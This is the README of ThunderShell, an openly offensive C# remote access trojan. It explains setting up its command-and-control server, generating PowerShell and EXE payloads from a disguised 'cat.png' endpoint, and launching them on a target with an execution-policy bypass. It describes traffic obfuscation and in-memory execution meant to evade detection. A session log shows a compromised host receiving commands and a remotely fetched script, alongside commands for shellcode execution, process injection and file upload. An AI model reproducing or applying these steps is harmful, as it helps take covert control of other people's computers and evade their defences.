# ThunderShell



ThunderShell is a C# RAT that communicates via HTTP requests. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network detection on the target system. RC4 is a weak cipher and is employed here to help obfuscate the traffic. HTTPS options should be used to provide integrity and strong encryption.

### Advantage against detection

The "core" RAT doesn't require a second stage to be injected / loaded in memory.

# Current version

Current release is 2.0.2

# Installation

Cloning the repository

```
git clone https://github.com/Mr-Un1k0d3r/ThunderShell
```

ThunderShell itself uses Python2 and requires the following dependencies:.

```
apt install python
apt install redis-server
apt install mysql-server
apt install mono-dmcs
apt install python-redis
apt install python-mysqldb
apt install python-tabulate
```

# ThunderShell features
### Payload delivery

Currently ThunderShell supports:

* `C#` as `cs`
* `powershell` as `ps`
* `C# exe` as `exe`

default option is powershell `ps`

### Multi users interface

ThunderShell can be used through the CLI and the web interface (under development) and supports several users at the same time on both the web interface and the CLI.

### Logging capabilities

The tool provides typical web traffic and error logs. Commands for every active session are saved on disk for future reference. The log folder structure contains each shell output sorted by date.

### Multithreading

ThunderShell client supports threading, meaning you can execute several commands in parallel on your target. ThunderShell is handles this for you on both the client and the server.

### Network traffic formating

(under development) ThunderShell allows you to configure the network request performed by the client by setting arbitrary headers and changing the format of the data sent to the server.

Example configuration file `profile.json`:

```
{
        "headers": {
                                "X-Powered-By": "ASP.NET",
                                "X-AspNet-Version": "4.0.30319",
                                "Set-Cookie": "ASP.NET_SessionId={{random}}[32];"
                },

        "autocommands": ["whoami", "cmd /c set"],
        "auto-interact": "on"
}
```

The `{{random}}[size]` syntax can be used to set arbitrary values at runtime.

The profile is loaded by the main configuration file shown below

### ThunderShell client features

The client is using a C# unmanaged approach to execute powershell code. This allows the user to execute arbitrary powershell commands directly on the shell, without invoking `powershell.exe`.

# Setup ThunderShell
### Configuration file

First, the configuration file needs to be configured properly. Here is an example of a configuration file `default.json`:

```
{
        "redis-host": "localhost",
        "redis-port": 6379,
        "mysql-host": "localhost",
        "mysql-user": "root",
        "mysql-pass": "",
        "mysql-port": "3306",
        "http-host": "1.1.1.1",
        "http-port": 1111,
        "http-server": "Microsoft-IIS/7.5",
        "http-download-path": "cat.png",
        "http-default-404": "default.html",
        "https-enabled": "off",
        "https-cert-path": "cert.pem",
        "encryption-key": "",
        "max-output-timeout": 5,
        "server-password": "",
        "aliases": {
                "myalias": ""
        },
        "cli-sync-delay": 5,
        "http-profile": "profile.json"
}
```

The `server-password` and `encryption-key` are generated automatically on the first run.

### Starting the server

The server, including the web interface, are started from the CLI:

```
$ python ThunderShell.py default.json MrUn1k0d3r -gui
```

`default.json` is the configuration file. `MrUn1k0d3r` is the username for the session. `-gui` launches the web interface.

Other user can start a CLI interface by adding the `-notthpd` switch to avoid trying to start the HTTP daemon a second time

### HTTPS configuration

If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:

```
-----BEGIN RSA PRIVATE KEY-----
... (private key in base64 encoding) ...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
... (certificate in base64 PEM encoding) ...
-----END CERTIFICATE-----
```

### Generating a payload

ThunderShell generates payloads through the web interface. The endpoint is defined by the `http-download-path` variable.
Based on the configuration file, to generate a payload simply browse to:
```
http://1.1.1.1:1111/cat.png
```

The endpoint supports several options that can be added to the url http://1.1.1.1:1111/cat.png/type/delay/

`type` supports only `ps` and `exe` for now. `delay` is the amount of sleep (in milliseconds) between each callback. Its default value is `10000` (10 seconds).

### Executing the code on the target

There are several way of executing the RAT on the target. One simple example is to use powershell:

```
http://1.1.1.1:1111/cat.png/ps/
```

Once the file is saved. Execute it using the following command

```
powershell -exec bypass import-module .\file.ps1
```

The executable can be used directly

```
http://1.1.1.1:1111/cat.png/exe/
```

The raw C# data can be downloaded and modified manually
```
http://1.1.1.1:1111/cat.png/cs/
```

# The interface

The example below executes Windows and Powershell commmands directly without invoking `powershell.exe`. The `fetch` command is used to obfuscate the powershell script. The server will download the data from the link specified, then encrypt it using the RC4 key and send it to the client. The client will then perform decryption and execute the code avoiding network detection.

```
python ThunderShell.py default.json MrUn1k0d3r -gui


             .#"    =[ Thunder Shell 2.0.1 | RingZer0 Team ]=
           .##"
        .###"       __       __    _________    __            __
       ###P        ###|     ###|  ##########|  ###|          ###|
     d########"    ###|     ###|  ###|         ###|          ###|
     ****####"     ###|_____###|  ###|__       ###|          ###|
       .###"       ############|  ######|      ###|          ###|
      .##"         ###|     ###|  ###|         ###|          ###|
     .#"           ###|     ###|  ###|______   ###|_______   ###|_______
    ."             ###|     ###|  ##########|  ###########|  ###########|



[-] install.lock not found
[*] Generating new keys
[+] Current Active session UUID is c8ab130e-9ec1-40d5-a5de-cb7c0ec9698a

[+] Starting web server on 192.168.17.129 port 8080

(Main)>>> help

Help Menu

=========

Commands    Args                                  Descriptions
----------  ------------------------------------  --------------------------------------------------------------------------------------------
list        full                                  List all active shells
interact    id                                    Interact with a session
show        (password,key,error,http,event) rows  Show server password, encryption key, errors, http or events log (default number of rows 10)
kill        id                                    kill shell (clear db only)
os          command                               Execute command on the system (local)
purge       force                                 WARNING! Delete all the Redis DB
exit                                              Exit the application
help

(Main)>>>
[+] Registering new shell DESKTOP-2JKIANV DESKTOP-2JKIANV\admin
[+] New shell ID 12 GUID is nDCCYACFWYrU6LwM

(Main)>>> interact 12

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> help

Help Menu
=========
Commands    Args            Descriptions
----------  --------------  ------------------------------------------------------------
background                  Return to the main console
fetch                       In memory execution of a script and execute a command
exec        path/url, cmd   In memory execution of code (shellcode)
read        path/url        Read a file on the remote host
upload      remote path     Upload a file on the remote system
ps          path/url, path  List processes
inject      pid, command    Inject command into a target process (max length 4096)
alias       key, value      Create an alias to avoid typing the same thing over and over
delay       milliseconds    Update the callback delay
help                        show this help menu

List of built in aliases
------------------------
wmiexec                     Remote-WmiExecute utility
searchevent                 Search-EventForUser utility

List user defined aliases
--------------------------

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> whoami

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: whoami

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
desktop-2jkianv\admin


(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> cmd.exe /c ver

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: cmd.exe /c ver

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
Microsoft Windows [Version 10.0.16299.431]

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> $psversiontable

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: $psversiontable

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
Name                           Value
----                           -----
PSVersion                      5.1.16299.431
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.16299.431
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1 Get-IEBookmarks

[+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1
[+] Executing Get-IEBookmarks

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[+] [(CLI)MrUn1k0d3r] Sending command: function Get-IEBookmarks {
        # Mr.Un1k0d3r - RingZer0 Team 2016
        # Get IE bookmarks URL

        BEGIN {
                $path = [Environment]::GetFolderPath('Favorites')
                Write-Output "[+] Bookmark are located in $($path)"
        }

        PROCESS {
                Get-ChildItem -Recurse $path -Include "*.url" | ForEach {
                                $data = Get-Content $_.fullname | Select-String -Pattern URL
                                Write-Output $data
                        }
        }

        END {
                Write-Output "[+] Process completed..."
        }
}
;Get-IEBookmarks

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
[*] Command output:
[+] Bookmark are located in C:\Users\admin\Favorites

URL=http://go.microsoft.com/fwlink/p/?LinkId=255142
[+] Process completed...

(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
```

### Splash page configuration

You can customize the "error" page that is returned for each GET request by specifying your HTML template through the `http-default-404` variable. The file needs to be placed in the `html` folder and dependencies (such as images) in the `download` folder. By default ThunderShell mimicks an IIS server and returns the default IIS server page.

### Delivering arbitrary files

Everything that is placed in the `download` folder can be downloaded from the web server. For example, `/root/ThunderShell/download/evil.exe` can be is available at: `http://1.1.1.1:1111/evil.exe`

# Release note

### Version 1.0.0

Initial release

### Version 2.0.0 (10/12/2018)

```
code rewrite from powershell to C# to add flexibility
multi threads and multiple shell now sync
```

### Version 2.0.1 (11/12/2018)

```
payload generator support exe
custom response headers added
```

### Version 2.0.2 (11/12/2018)

```
bug fix
auto install dependencies on first run
```



# Upcoming features

* Implement in-memory protection using C# and push / pull code there to avoid sending the data several times
* Implement different delivery methods
* Inject the PowerShell RAT into another process
* Fully integrated keylogger

# Credit

Mr.Un1k0d3r @MrUn1k0d3r

Tazz0 @Tazz019

RingZer0 Team 2017

